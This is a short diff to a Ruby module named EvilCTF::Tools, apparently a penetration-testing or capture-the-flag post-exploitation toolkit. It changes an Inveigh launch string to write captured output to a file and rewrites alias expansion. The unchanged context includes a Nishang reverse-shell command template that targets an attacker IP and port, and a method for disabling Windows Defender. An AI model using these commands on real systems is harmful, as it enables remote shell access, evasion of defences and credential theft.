@@ -397,7 +397,7 @@ module EvilCTF::Tools
   NISHANG_REV_REMOTE = 'C:\Users\Public\nishang-master\Shells\Invoke-PowerShellTcp.ps1'
   NISHANG_REV_PS = 'IEX (Get-Content "[NishangRevRemote]" -Raw); Invoke-PowerShellTcp -Reverse -IPAddress [AttackerIP] -Port [AttackerPort]'
   INVEIGH_REMOTE = 'C:\Users\Public\Inveigh.ps1'
-  INVEIGH_START_PS = 'IEX (Get-Content "[InveighRemote]" -Raw); Invoke-Inveigh -ConsoleOutput Y'
+  INVEIGH_START_PS = 'IEX (Get-Content "[InveighRemote]" -Raw); Invoke-Inveigh -ConsoleOutput N -FileOutput Y'
 
   def self.disable_defender(shell)
   # Check OS version
@@ -533,10 +533,17 @@ end
       }
     end
     def expand_alias(cmd)
-      @aliases.each do |k, v|
-        return cmd.sub(k, v) if cmd.start_with?(k)
-      end
-      cmd
+      stripped = cmd.to_s.lstrip
+      return cmd if stripped.empty?
+
+      token, remainder = stripped.split(/\s+/, 2)
+      alias_expansion = @aliases[token]
+      return cmd unless alias_expansion
+
+      expanded = remainder && !remainder.empty? ? "#{alias_expansion} #{remainder}" : alias_expansion
+
+      leading_ws_len = cmd.length - stripped.length
+      return (' ' * leading_ws_len) + expanded
     end
     def expand_macro(name, shell, webhook: nil)
       macro_name = name.downcase
